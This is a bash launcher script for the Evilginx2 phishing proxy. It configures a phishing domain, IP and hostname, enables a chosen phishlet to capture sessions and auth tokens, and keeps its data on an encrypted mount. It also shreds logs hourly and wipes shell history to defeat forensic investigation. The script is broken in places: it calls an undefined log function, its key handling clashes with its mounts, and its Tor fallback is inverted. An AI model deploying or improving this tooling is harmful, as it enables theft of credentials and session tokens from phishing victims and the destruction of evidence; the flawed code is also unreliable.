# MUST BE UPDATED

#!/bin/bash
# === EVILGINX2 OPSEC LAUNCHER (ENTERPRISE EDITION) ===
# Features: Encrypted RAM disk, Automatic TOR failover, Zero forensic evidence
# Version: Evilginx2-compatible | Tested on v2.4+

set -eo pipefail
exec 3>&1 > >(tee -a /var/log/evilginx/launcher.log) 2>&1

### === OPSEC CONFIGURATION ===
export OPSEC_ROOT="$HOME/.evilginx"
export ENCRYPTED_LIVE="$OPSEC_ROOT/.secure"
export TMPFS_SIZE="512M"  # Increased for session storage
export CIPHER="aes-256-xts"
export HASH="sha512"
export KDF_ITER="500000"
export LUKS_HEADER="$OPSEC_ROOT/.luks_header"
export TOR_FALLBACK=true
export CLEAR_LOGS_INTERVAL=3600  # 1 hour log rotation

### === SECURE UTILITIES ===
generate_key() {
  head -c 32 /dev/urandom | base64 | tr -d '\n' > "$ENCRYPTED_LIVE/.master.key"
  chmod 600 "$ENCRYPTED_LIVE/.master.key"
}

secure_mount() {
  # Initialize encrypted workspace
  if ! mountpoint -q "$ENCRYPTED_LIVE"; then
    log "🔒 Initializing encrypted workspace"
    
    mkdir -p "$ENCRYPTED_LIVE"
    if [[ ! -f "$LUKS_HEADER" ]]; then
      dd if=/dev/urandom of="$LUKS_HEADER" bs=1M count=64 status=none
    fi

    loop_dev=$(losetup -f --show "$LUKS_HEADER")
    trap 'losetup -d "$loop_dev"' EXIT

    echo -n "$(cat "$ENCRYPTED_LIVE/.master.key")" | cryptsetup -q \
      --cipher "$CIPHER" \
      --hash "$HASH" \
      --iter-time "$KDF_ITER" \
      luksFormat "$loop_dev" -

    echo -n "$(cat "$ENCRYPTED_LIVE/.master.key")" | cryptsetup -q \
      open "$loop_dev" evilginx_secure -

    mkfs.ext4 -q /dev/mapper/evilginx_secure
    mount -t tmpfs -o size=$TMPFS_SIZE tmpfs "$ENCRYPTED_LIVE"
    mount /dev/mapper/evilginx_secure "$ENCRYPTED_LIVE"

    log "✅ Encrypted workspace mounted"
  fi
}

### === EVILGINX CONFIGURATION ===
configure_evilginx() {
  local domain ip

  # Load or prompt for configuration
  if [[ -f "$OPSEC_ROOT/.last_config" ]]; then
    source "$OPSEC_ROOT/.last_config"
  fi

  read -rp "🌐 Domain [$LAST_DOMAIN]: " domain
  export DOMAIN="${domain:-$LAST_DOMAIN}"

  if [[ "$TOR_FALLBACK" = true ]] && ! systemctl is-active --quiet tor; then
    log "⚠️  TOR not active - using direct connection"
    ip=$(curl --socks5-hostname 127.0.0.1:9050 -s ifconfig.me || curl -s ifconfig.me)
  else
    ip=$(curl -s ifconfig.me)
  fi

  read -rp "🌍 External IP [$ip]: " input_ip
  export IP="${input_ip:-$ip}"

  # Save config
  cat > "$OPSEC_ROOT/.last_config" <<EOF
LAST_DOMAIN="$DOMAIN"
LAST_IP="$IP"
EOF

  # Initialize directories
  mkdir -p "$ENCRYPTED_LIVE"/{phishlets,sessions,auth_tokens}
  
  # Configure Evilginx2
  evilginx -p "$ENCRYPTED_LIVE/phishlets" -c "config domain $DOMAIN"
  evilginx -p "$ENCRYPTED_LIVE/phishlets" -c "config ip $IP"
}

### === PHISHLET MANAGEMENT ===
select_phishlet() {
  # Get available phishlets
  mapfile -t PHISHLETS < <(evilginx -p "$ENCRYPTED_LIVE/phishlets" -c "phishlets" | \
    awk '/^\| [a-z]/ {print $2}')

  # Display menu
  echo -e "\n📜 Available Phishlets:\n"
  for i in "${!PHISHLETS[@]}"; do
    printf "%2d) %s\n" $((i+1)) "${PHISHLETS[i]}"
  done

  # Prompt for selection
  while true; do
    read -rp "📌 Select phishlet to enable [1-${#PHISHLETS[@]}]: " choice
    if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#PHISHLETS[@]} )); then
      export PHISHLET="${PHISHLETS[choice-1]}"
      break
    fi
  done

  # Configure hostname
  read -rp "📎 Hostname for $PHISHLET [login.$DOMAIN]: " hostname
  export HOSTNAME="${hostname:-login.$DOMAIN}"

  evilginx -p "$ENCRYPTED_LIVE/phishlets" -c "phishlets hostname $PHISHLET $HOSTNAME"
  evilginx -p "$ENCRYPTED_LIVE/phishlets" -c "phishlets enable $PHISHLET"
}

### === LOG MANAGEMENT ===
start_log_cleaner() {
  (while true; do
    sleep $CLEAR_LOGS_INTERVAL
    find "$ENCRYPTED_LIVE" -type f -name "*.log" -exec shred -u {} +
  done) &
}

### === MAIN EXECUTION ===
# Initialize environment
mkdir -p "$OPSEC_ROOT"
generate_key
secure_mount

# Configure Evilginx2
configure_evilginx
select_phishlet

# Start background services
start_log_cleaner

log "🚀 Evilginx2 operational at https://$HOSTNAME"
log "🔐 All session data encrypted in RAM"

# Secure shell history
shred -u ~/.bash_history && history -c